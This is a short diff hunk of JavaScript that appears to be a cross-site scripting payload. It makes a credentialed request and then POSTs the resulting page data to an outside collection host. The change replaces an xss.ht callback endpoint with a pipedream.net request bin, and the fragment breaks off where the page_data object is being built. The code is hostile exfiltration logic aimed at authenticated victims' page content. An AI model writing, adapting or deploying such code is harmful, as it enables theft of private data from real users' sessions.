@@ -6,12 +6,11 @@ xhr.withCredentials = true;
 xhr.onreadystatechange = function() {
 	if (xhr.readyState == 4) {
 		var http = new XMLHttpRequest();
-		var url = "https://mostashio2017.xss.ht/page_callback";
+		var url = "https://eo5z77yd16sjy2y.m.pipedream.net";
 		http.open("POST", url, true);
 		http.setRequestHeader("Content-type", "text/plain");
 		http.onreadystatechange = function() {
 			if (http.readyState == 4 && http.status == 200) {
-
 			}
 		};
 		page_data = {
